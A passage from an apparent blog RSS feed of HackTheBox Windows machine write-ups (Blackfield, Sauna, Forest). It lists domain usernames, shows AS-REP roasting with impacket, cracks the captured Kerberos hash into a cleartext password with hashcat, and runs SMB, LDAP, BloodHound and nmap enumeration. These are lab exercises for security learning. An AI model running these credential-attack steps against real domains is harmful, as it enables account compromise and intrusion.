+HBlaziewske D 0 Wed Jun 3 17:47:12 2020
+HColantino D 0 Wed Jun 3 17:47:12 2020
+HConforto D 0 Wed Jun 3 17:47:12 2020
+HCunnally D 0 Wed Jun 3 17:47:12 2020
+HGougen D 0 Wed Jun 3 17:47:12 2020
+HKostova D 0 Wed Jun 3 17:47:12 2020
+IChristijr D 0 Wed Jun 3 17:47:12 2020
+IKoledo D 0 Wed Jun 3 17:47:12 2020
+IKotecky D 0 Wed Jun 3 17:47:12 2020
+ISantosi D 0 Wed Jun 3 17:47:12 2020
+JAngvall D 0 Wed Jun 3 17:47:12 2020
+JBehmoiras D 0 Wed Jun 3 17:47:12 2020
+JDanten D 0 Wed Jun 3 17:47:12 2020
+JDjouka D 0 Wed Jun 3 17:47:12 2020
+JKondziola D 0 Wed Jun 3 17:47:12 2020
+JLeytushsenior D 0 Wed Jun 3 17:47:12 2020
+JLuthner D 0 Wed Jun 3 17:47:12 2020
+JMoorehendrickson D 0 Wed Jun 3 17:47:12 2020
+JPistachio D 0 Wed Jun 3 17:47:12 2020
+JScima D 0 Wed Jun 3 17:47:12 2020
+JSebaali D 0 Wed Jun 3 17:47:12 2020
+JShoenherr D 0 Wed Jun 3 17:47:12 2020
+JShuselvt D 0 Wed Jun 3 17:47:12 2020
+KAmavisca D 0 Wed Jun 3 17:47:12 2020
+KAtolikian D 0 Wed Jun 3 17:47:12 2020
+KBrokinn D 0 Wed Jun 3 17:47:12 2020
+KCockeril D 0 Wed Jun 3 17:47:12 2020
+KColtart D 0 Wed Jun 3 17:47:12 2020
+KCyster D 0 Wed Jun 3 17:47:12 2020
+KDorney D 0 Wed Jun 3 17:47:12 2020
+KKoesno D 0 Wed Jun 3 17:47:12 2020
+KLangfur D 0 Wed Jun 3 17:47:12 2020
+KMahalik D 0 Wed Jun 3 17:47:12 2020
+KMasloch D 0 Wed Jun 3 17:47:12 2020
+KMibach D 0 Wed Jun 3 17:47:12 2020
+KParvankova D 0 Wed Jun 3 17:47:12 2020
+KPregnolato D 0 Wed Jun 3 17:47:12 2020
+KRasmor D 0 Wed Jun 3 17:47:12 2020
+KShievitz D 0 Wed Jun 3 17:47:12 2020
+KSojdelius D 0 Wed Jun 3 17:47:12 2020
+KTambourgi D 0 Wed Jun 3 17:47:12 2020
+KVlahopoulos D 0 Wed Jun 3 17:47:12 2020
+KZyballa D 0 Wed Jun 3 17:47:12 2020
+LBajewsky D 0 Wed Jun 3 17:47:12 2020
+LBaligand D 0 Wed Jun 3 17:47:12 2020
+LBarhamand D 0 Wed Jun 3 17:47:12 2020
+LBirer D 0 Wed Jun 3 17:47:12 2020
+LBobelis D 0 Wed Jun 3 17:47:12 2020
+LChippel D 0 Wed Jun 3 17:47:12 2020
+LChoffin D 0 Wed Jun 3 17:47:12 2020
+LCominelli D 0 Wed Jun 3 17:47:12 2020
+LDruge D 0 Wed Jun 3 17:47:12 2020
+LEzepek D 0 Wed Jun 3 17:47:12 2020
+LHyungkim D 0 Wed Jun 3 17:47:12 2020
+LKarabag D 0 Wed Jun 3 17:47:12 2020
+LKirousis D 0 Wed Jun 3 17:47:12 2020
+LKnade D 0 Wed Jun 3 17:47:12 2020
+LKrioua D 0 Wed Jun 3 17:47:12 2020
+LLefebvre D 0 Wed Jun 3 17:47:12 2020
+LLoeradeavilez D 0 Wed Jun 3 17:47:12 2020
+LMichoud D 0 Wed Jun 3 17:47:12 2020
+LTindall D 0 Wed Jun 3 17:47:12 2020
+LYturbe D 0 Wed Jun 3 17:47:12 2020
+MArcynski D 0 Wed Jun 3 17:47:12 2020
+MAthilakshmi D 0 Wed Jun 3 17:47:12 2020
+MAttravanam D 0 Wed Jun 3 17:47:12 2020
+MBrambini D 0 Wed Jun 3 17:47:12 2020
+MHatziantoniou D 0 Wed Jun 3 17:47:12 2020
+MHoerauf D 0 Wed Jun 3 17:47:12 2020
+MKermarrec D 0 Wed Jun 3 17:47:12 2020
+MKillberg D 0 Wed Jun 3 17:47:12 2020
+MLapesh D 0 Wed Jun 3 17:47:12 2020
+MMakhsous D 0 Wed Jun 3 17:47:12 2020
+MMerezio D 0 Wed Jun 3 17:47:12 2020
+MNaciri D 0 Wed Jun 3 17:47:12 2020
+MShanmugarajah D 0 Wed Jun 3 17:47:12 2020
+MSichkar D 0 Wed Jun 3 17:47:12 2020
+MTemko D 0 Wed Jun 3 17:47:12 2020
+MTipirneni D 0 Wed Jun 3 17:47:12 2020
+MTonuri D 0 Wed Jun 3 17:47:12 2020
+MVanarsdel D 0 Wed Jun 3 17:47:12 2020
+NBellibas D 0 Wed Jun 3 17:47:12 2020
+NDikoka D 0 Wed Jun 3 17:47:12 2020
+NGenevro D 0 Wed Jun 3 17:47:12 2020
+NGoddanti D 0 Wed Jun 3 17:47:12 2020
+NMrdirk D 0 Wed Jun 3 17:47:12 2020
+NPulido D 0 Wed Jun 3 17:47:12 2020
+NRonges D 0 Wed Jun 3 17:47:12 2020
+NSchepkie D 0 Wed Jun 3 17:47:12 2020
+NVanpraet D 0 Wed Jun 3 17:47:12 2020
+OBelghazi D 0 Wed Jun 3 17:47:12 2020
+OBushey D 0 Wed Jun 3 17:47:12 2020
+OHardybala D 0 Wed Jun 3 17:47:12 2020
+OLunas D 0 Wed Jun 3 17:47:12 2020
+ORbabka D 0 Wed Jun 3 17:47:12 2020
+PBourrat D 0 Wed Jun 3 17:47:12 2020
+PBozzelle D 0 Wed Jun 3 17:47:12 2020
+PBranti D 0 Wed Jun 3 17:47:12 2020
+PCapperella D 0 Wed Jun 3 17:47:12 2020
+PCurtz D 0 Wed Jun 3 17:47:12 2020
+PDoreste D 0 Wed Jun 3 17:47:12 2020
+PGegnas D 0 Wed Jun 3 17:47:12 2020
+PMasulla D 0 Wed Jun 3 17:47:12 2020
+PMendlinger D 0 Wed Jun 3 17:47:12 2020
+PParakat D 0 Wed Jun 3 17:47:12 2020
+PProvencer D 0 Wed Jun 3 17:47:12 2020
+PTesik D 0 Wed Jun 3 17:47:12 2020
+PVinkovich D 0 Wed Jun 3 17:47:12 2020
+PVirding D 0 Wed Jun 3 17:47:12 2020
+PWeinkaus D 0 Wed Jun 3 17:47:12 2020
+RBaliukonis D 0 Wed Jun 3 17:47:12 2020
+RBochare D 0 Wed Jun 3 17:47:12 2020
+RKrnjaic D 0 Wed Jun 3 17:47:12 2020
+RNemnich D 0 Wed Jun 3 17:47:12 2020
+RPoretsky D 0 Wed Jun 3 17:47:12 2020
+RStuehringer D 0 Wed Jun 3 17:47:12 2020
+RSzewczuga D 0 Wed Jun 3 17:47:12 2020
+RVallandas D 0 Wed Jun 3 17:47:12 2020
+RWeatherl D 0 Wed Jun 3 17:47:12 2020
+RWissor D 0 Wed Jun 3 17:47:12 2020
+SAbdulagatov D 0 Wed Jun 3 17:47:12 2020
+SAjowi D 0 Wed Jun 3 17:47:12 2020
+SAlguwaihes D 0 Wed Jun 3 17:47:12 2020
+SBonaparte D 0 Wed Jun 3 17:47:12 2020
+SBouzane D 0 Wed Jun 3 17:47:12 2020
+SChatin D 0 Wed Jun 3 17:47:12 2020
+SDellabitta D 0 Wed Jun 3 17:47:12 2020
+SDhodapkar D 0 Wed Jun 3 17:47:12 2020
+SEulert D 0 Wed Jun 3 17:47:12 2020
+SFadrigalan D 0 Wed Jun 3 17:47:12 2020
+SGolds D 0 Wed Jun 3 17:47:12 2020
+SGrifasi D 0 Wed Jun 3 17:47:12 2020
+SGtlinas D 0 Wed Jun 3 17:47:12 2020
+SHauht D 0 Wed Jun 3 17:47:12 2020
+SHederian D 0 Wed Jun 3 17:47:12 2020
+SHelregel D 0 Wed Jun 3 17:47:12 2020
+SKrulig D 0 Wed Jun 3 17:47:12 2020
+SLewrie D 0 Wed Jun 3 17:47:12 2020
+SMaskil D 0 Wed Jun 3 17:47:12 2020
+Smocker D 0 Wed Jun 3 17:47:12 2020
+SMoyta D 0 Wed Jun 3 17:47:12 2020
+SRaustiala D 0 Wed Jun 3 17:47:12 2020
+SReppond D 0 Wed Jun 3 17:47:12 2020
+SSicliano D 0 Wed Jun 3 17:47:12 2020
+SSilex D 0 Wed Jun 3 17:47:12 2020
+SSolsbak D 0 Wed Jun 3 17:47:12 2020
+STousignaut D 0 Wed Jun 3 17:47:12 2020
+support D 0 Wed Jun 3 17:47:12 2020
+svc_backup D 0 Wed Jun 3 17:47:12 2020
+SWhyte D 0 Wed Jun 3 17:47:12 2020
+SWynigear D 0 Wed Jun 3 17:47:12 2020
+TAwaysheh D 0 Wed Jun 3 17:47:12 2020
+TBadenbach D 0 Wed Jun 3 17:47:12 2020
+TCaffo D 0 Wed Jun 3 17:47:12 2020
+TCassalom D 0 Wed Jun 3 17:47:12 2020
+TEiselt D 0 Wed Jun 3 17:47:12 2020
+TFerencdo D 0 Wed Jun 3 17:47:12 2020
+TGaleazza D 0 Wed Jun 3 17:47:12 2020
+TKauten D 0 Wed Jun 3 17:47:12 2020
+TKnupke D 0 Wed Jun 3 17:47:12 2020
+TLintlop D 0 Wed Jun 3 17:47:12 2020
+TMusselli D 0 Wed Jun 3 17:47:12 2020
+TOust D 0 Wed Jun 3 17:47:12 2020
+TSlupka D 0 Wed Jun 3 17:47:12 2020
+TStausland D 0 Wed Jun 3 17:47:12 2020
+TZumpella D 0 Wed Jun 3 17:47:12 2020
+UCrofskey D 0 Wed Jun 3 17:47:12 2020
+UMarylebone D 0 Wed Jun 3 17:47:12 2020
+UPyrke D 0 Wed Jun 3 17:47:12 2020
+VBublavy D 0 Wed Jun 3 17:47:12 2020
+VButziger D 0 Wed Jun 3 17:47:12 2020
+VFuscca D 0 Wed Jun 3 17:47:12 2020
+VLitschauer D 0 Wed Jun 3 17:47:12 2020
+VMamchuk D 0 Wed Jun 3 17:47:12 2020
+VMarija D 0 Wed Jun 3 17:47:12 2020
+VOlaosun D 0 Wed Jun 3 17:47:12 2020
+VPapalouca D 0 Wed Jun 3 17:47:12 2020
+WSaldat D 0 Wed Jun 3 17:47:12 2020
+WVerzhbytska D 0 Wed Jun 3 17:47:12 2020
+WZelazny D 0 Wed Jun 3 17:47:12 2020
+XBemelen D 0 Wed Jun 3 17:47:12 2020
+XDadant D 0 Wed Jun 3 17:47:12 2020
+XDebes D 0 Wed Jun 3 17:47:12 2020
+XKonegni D 0 Wed Jun 3 17:47:12 2020
+XRykiel D 0 Wed Jun 3 17:47:12 2020
+YBleasdale D 0 Wed Jun 3 17:47:12 2020
+YHuftalin D 0 Wed Jun 3 17:47:12 2020
+YKivlen D 0 Wed Jun 3 17:47:12 2020
+YKozlicki D 0 Wed Jun 3 17:47:12 2020
+YNyirenda D 0 Wed Jun 3 17:47:12 2020
+YPredestin D 0 Wed Jun 3 17:47:12 2020
+YSeturino D 0 Wed Jun 3 17:47:12 2020
+YSkoropada D 0 Wed Jun 3 17:47:12 2020
+YVonebers D 0 Wed Jun 3 17:47:12 2020
+YZarpentine D 0 Wed Jun 3 17:47:12 2020
+ZAlatti D 0 Wed Jun 3 17:47:12 2020
+ZKrenselewski D 0 Wed Jun 3 17:47:12 2020
+ZMalaab D 0 Wed Jun 3 17:47:12 2020
+ZMiick D 0 Wed Jun 3 17:47:12 2020
+ZScozzari D 0 Wed Jun 3 17:47:12 2020
+ZTimofeeff D 0 Wed Jun 3 17:47:12 2020
+ZWausik D 0 Wed Jun 3 17:47:12 2020
+5102079 blocks of size 4096. 1697641 blocks available
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ smbclient -N //10.10.10.192/forensic
+Try &amp;#34;help&amp;#34; to get a list of possible commands.
+smb: \&amp;gt; ls
+NT_STATUS_ACCESS_DENIED listing \*
+smb: \&amp;gt;
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>Each directory is empty
+&lt;ul>
+&lt;li>But we can use it to create a userlist and try &lt;code>AS-REP&lt;/code>-roasting&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ impacket-GetNPUsers -usersfile users.list -dc-ip 10.10.10.192 blackfield.local/
+Impacket v0.11.0 - Copyright 2023 Fortra
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+...
+$krb5asrep$23$support@BLACKFIELD.LOCAL:1f10d897a1b644a032f41814413ebe39$b16365d416a55a510ac198406233651071444fb1de08ba43529cd7dad0a9ca5025653e234e9ee14f3cbafabb4a492089bfdf57e1b7e2328003154bafdb0bcea191020a3dce2f3aac242166054e1c32c90f2fc1f932f0c92a62bf3d30a1ce26539d5d0b14143f0e409b7c66eeefb1c7fc5c900b17595a083fb23ae675f82d9eae5b02fef0f5178b1f35ca50fd98b3f5adff177028626db9ccccbf841746a01fa7d734f9fbc6f91b62a9a676c1f188a48624c771b75652b4cf94df83849e7bdcb6b9797c4176c3e0e7327b41c3610fcb162b0279f313c79a06c9d3cb127f606198db65bf5c2bae16a91b5b9ec05e5337ef0c623eb2
+[-] User svc_backup doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
+...
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>Crack it with &lt;code>hashcat&lt;/code>
+&lt;ul>
+&lt;li>&lt;code>support:#00^BlackKnight&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting
+OpenCL API (OpenCL 3.0 PoCL 3.1+debian Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+==================================================================================================================================================
+* Device #1: pthread-sandybridge-12th Gen Intel(R) Core(TM) i5-12400, 1436/2936 MB (512 MB allocatable), 2MCU
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+...
+$krb5asrep$23$support@BLACKFIELD.LOCAL:1f10d897a1b644a032f41814413ebe39$b16365d416a55a510ac198406233651071444fb1de08ba43529cd7dad0a9ca5025653e234e9ee14f3cbafabb4a492089bfdf57e1b7e2328003154bafdb0bcea191020a3dce2f3aac242166054e1c32c90f2fc1f932f0c92a62bf3d30a1ce26539d5d0b14143f0e409b7c66eeefb1c7fc5c900b17595a083fb23ae675f82d9eae5b02fef0f5178b1f35ca50fd98b3f5adff177028626db9ccccbf841746a01fa7d734f9fbc6f91b62a9a676c1f188a48624c771b75652b4cf94df83849e7bdcb6b9797c4176c3e0e7327b41c3610fcb162b0279f313c79a06c9d3cb127f606198db65bf5c2bae16a91b5b9ec05e5337ef0c623eb2:#00^BlackKnight
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
+Hash.Target......: $krb5asrep$23$support@BLACKFIELD.LOCAL:1f10d897a1b6...623eb2
+Time.Started.....: Sun Sep 17 19:11:50 2023 (13 secs)
+Time.Estimated...: Sun Sep 17 19:12:03 2023 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........: 1089.9 kH/s (0.41ms) @ Accel:256 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 14336000/14344385 (99.94%)
+Rejected.........: 0/14336000 (0.00%)
+Restore.Point....: 14335488/14344385 (99.94%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: #1*6)0 -&amp;gt; #!hrvert
+Hardware.Mon.#1..: Util: 91%
+Started: Sun Sep 17 19:11:49 2023
+Stopped: Sun Sep 17 19:12:05 2023
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>The creds are valid
+&lt;ul>
+&lt;li>But no &lt;code>winrm&lt;/code> access&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ crackmapexec smb 10.10.10.192 -u support -p &amp;#39;#00^BlackKnight&amp;#39;
+SMB 10.10.10.192 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
+SMB 10.10.10.192 445 DC01 [+] BLACKFIELD.local\support:#00^BlackKnight
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ crackmapexec winrm 10.10.10.192 -u support -p &amp;#39;#00^BlackKnight&amp;#39;
+SMB 10.10.10.192 5985 DC01 [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
+HTTP 10.10.10.192 5985 DC01 [*] http://10.10.10.192:5985/wsman
+WINRM 10.10.10.192 5985 DC01 [-] BLACKFIELD.local\support:#00^BlackKnight
+&lt;/code>&lt;/pre>&lt;h2 id="user-1">User #1&lt;/h2>
+&lt;ul>
+&lt;li>Nothing new in &lt;code>smb&lt;/code> except for &lt;code>SYSVOL&lt;/code> and &lt;code>NETLOGON&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ smbmap -u support -p &amp;#39;#00^BlackKnight&amp;#39; -H 10.10.10.192
+[+] IP: 10.10.10.192:445 Name: BLACKFIELD.local
+Disk Permissions Comment
+---- ----------- -------
+ADMIN$ NO ACCESS Remote Admin
+C$ NO ACCESS Default share
+forensic NO ACCESS Forensic / Audit share.
+IPC$ READ ONLY Remote IPC
+NETLOGON READ ONLY Logon server share
+profiles$ READ ONLY
+SYSVOL READ ONLY Logon server share
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>No &lt;code>Kerberoastable&lt;/code> users&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ impacket-GetUserSPNs blackfield.local/&amp;#39;support&amp;#39;:&amp;#39;#00^BlackKnight&amp;#39; -dc-ip dc01.blackfield.local -request
+Impacket v0.11.0 - Copyright 2023 Fortra
+No entries found!
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>&lt;code>ldapsearch&lt;/code> to retrieve &lt;code>samaccountname&lt;/code> of domain controller&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ ldapsearch -H ldap://10.10.10.192 -x -b &amp;#34;DC=blackfield,DC=local&amp;#34; -D &amp;#39;support@blackfield.local&amp;#39; -w &amp;#39;#00^BlackKnight&amp;#39;
+# extended LDIF
+#
+# LDAPv3
+# base &amp;lt;DC=blackfield,DC=local&amp;gt; with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+# BLACKFIELD.local
+dn: DC=BLACKFIELD,DC=local
+objectClass: top
+objectClass: domain
+objectClass: domainDNS
+...
+dn: CN=DC01,OU=Domain Controllers,DC=BLACKFIELD,DC=local
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+objectClass: computer
+cn: DC01
+distinguishedName: CN=DC01,OU=Domain Controllers,DC=BLACKFIELD,DC=local
+instanceType: 4
+whenCreated: 20200223111400.0Z
+whenChanged: 20230918021908.0Z
+uSNCreated: 12293
+uSNChanged: 233542
+name: DC01
+objectGUID:: yKWttevtGU+AkuFOUWYvng==
+userAccountControl: 532480
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 132269516749519355
+lastLogoff: 0
+lastLogon: 133395347215321691
+localPolicyFlags: 0
+pwdLastSet: 133394771382736467
+primaryGroupID: 516
+objectSid:: AQUAAAAAAAUVAAAA3sEE+lnfq4Ei72nU6AMAAA==
+accountExpires: 9223372036854775807
+logonCount: 134
+sAMAccountName: DC01$
+sAMAccountType: 805306369
+operatingSystem: Windows Server 2019 Standard
+operatingSystemVersion: 10.0 (17763)
+serverReferenceBL: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=C
+onfiguration,DC=BLACKFIELD,DC=local
+dNSHostName: DC01.BLACKFIELD.local
+...
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>Let&amp;rsquo;s launch bloodhound&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ bloodhound-python -c all -u support -p &amp;#39;#00^BlackKnight&amp;#39; -d blackfield.local -dc dc01.blackfield.local -ns 10.10.10.192 --zip
+INFO: Found AD domain: blackfield.local
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: dc01.blackfield.local
+INFO: Kerberos auth to LDAP failed, trying NTLM
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 18 computers
+INFO: Connecting to LDAP server: dc01.blackfield.local
+INFO: Kerberos auth to LDAP failed, trying NTLM
+INFO: Found 316 users
+INFO: Found 52 groups
+INFO: Found 2 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>&lt;code>support&lt;/code> has &lt;code>ForceChangePassword&lt;/code> rights over &lt;code>audit2020&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/blackfield/images/1.png">&lt;/p></description></item><item><title>[HTB] Machine: Sauna</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/sauna/</link><pubDate>Mon, 26 Jun 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/sauna/</guid><description>&lt;h1 id="sauna">Sauna&lt;/h1>
+&lt;h2 id="enumeration">Enumeration&lt;/h2>
+&lt;ul>
+&lt;li>&lt;code>nmap&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -sC -sV 10.10.10.175 -T4
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-28 17:36 BST
+Nmap scan report for 10.10.10.175 (10.10.10.175)
+Host is up (0.11s latency).
+Not shown: 988 filtered tcp ports (no-response)
+PORT STATE SERVICE VERSION
+53/tcp open domain Simple DNS Plus
+80/tcp open http Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Egotistical Bank :: Home
+| http-methods:
+|_ Potentially risky methods: TRACE
+88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-06-28 23:35:53Z)
+135/tcp open msrpc Microsoft Windows RPC
+139/tcp open netbios-ssn Microsoft Windows netbios-ssn
+389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
+445/tcp open microsoft-ds?
+464/tcp open kpasswd5?
+593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
+636/tcp open tcpwrapped
+3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
+3269/tcp open tcpwrapped
+Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
+Host script results:
+|_clock-skew: 6h59m29s
+| smb2-security-mode:
+| 311:
+|_ Message signing enabled and required
+| smb2-time:
+| date: 2023-06-28T23:36:05
+|_ start_date: N/A
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 69.94 seconds
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>&lt;code>gobuster&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ gobuster dir -u http://10.10.10.175 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x asp,aspx
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url: http://10.10.10.175
+[+] Method: GET
+[+] Threads: 50
+[+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes: 404
+[+] User Agent: gobuster/3.5
+[+] Extensions: aspx,asp
+[+] Timeout: 10s
+===============================================================
+2023/06/28 18:47:01 Starting gobuster in directory enumeration mode
+===============================================================
+/images (Status: 301) [Size: 150] [--&amp;gt; http://10.10.10.175/images/]
+/Images (Status: 301) [Size: 150] [--&amp;gt; http://10.10.10.175/Images/]
+/css (Status: 301) [Size: 147] [--&amp;gt; http://10.10.10.175/css/]
+/fonts (Status: 301) [Size: 149] [--&amp;gt; http://10.10.10.175/fonts/]
+/IMAGES (Status: 301) [Size: 150] [--&amp;gt; http://10.10.10.175/IMAGES/]
+/Fonts (Status: 301) [Size: 149] [--&amp;gt; http://10.10.10.175/Fonts/]
+/CSS (Status: 301) [Size: 147] [--&amp;gt; http://10.10.10.175/CSS/]
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>&lt;code>smbclient&lt;/code> found nothing&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ smbclient -N -L //10.10.10.175
+Anonymous login successful
+Sharename Type Comment
+--------- ---- -------
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.10.175 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>Web server&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/sauna/images/1.png">&lt;/p></description></item><item><title>[HTB] Machine: Forest</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/forest/</link><pubDate>Sat, 24 Jun 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/forest/</guid><description>&lt;h1 id="forest">Forest&lt;/h1>
+&lt;h2 id="enumeration">Enumeration&lt;/h2>
+&lt;ul>
+&lt;li>&lt;code>nmap&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ nmap -sC -sV -Pn 10.10.10.161 -T4
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-26 16:32 BST
+Nmap scan report for 10.10.10.161 (10.10.10.161)
+Host is up (0.15s latency).
+Not shown: 989 closed tcp ports (conn-refused)
+PORT STATE SERVICE VERSION
+53/tcp open domain Simple DNS Plus
+88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-06-26 15:39:16Z)
+135/tcp open msrpc Microsoft Windows RPC
+139/tcp open netbios-ssn Microsoft Windows netbios-ssn
+389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
+464/tcp open kpasswd5?
+593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
+636/tcp open tcpwrapped
+3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+3269/tcp open tcpwrapped
+Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
+Host script results:
+|_clock-skew: mean: 2h26m18s, deviation: 4h02m30s, median: 6m17s
+| smb-security-mode:
+| account_used: &amp;lt;blank&amp;gt;
+| authentication_level: user
+| challenge_response: supported
+|_ message_signing: required
+| smb2-security-mode:
+| 311:
+|_ Message signing enabled and required
+| smb2-time:
+| date: 2023-06-26T15:39:27
+|_ start_date: 2023-06-26T14:24:16
+| smb-os-discovery:
+| OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+| Computer name:
+FOREST
+| NetBIOS computer name: FOREST\x00
+| Domain name: htb.local
+| Forest name: htb.local
+| FQDN: FOREST.htb.local
+|_ System time: 2023-06-26T08:39:24-07:00
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 42.94 seconds
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>Dns
+&lt;ul>
+&lt;li>No results with zone transfer&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/forest/images/1.png">&lt;/p></description></item></channel></rss>
